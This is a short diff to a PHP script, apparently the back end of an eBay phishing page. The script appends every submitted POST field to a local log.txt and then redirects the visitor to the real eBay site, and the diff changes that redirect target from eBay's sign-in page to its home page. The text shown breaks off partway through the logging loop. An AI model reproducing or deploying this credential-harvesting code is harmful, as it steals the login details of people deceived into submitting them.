@@ -1,5 +1,5 @@
 <?php
-header ('Location: https://www.ebay.com/signin');
+header ('Location: https://www.ebay.com/');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
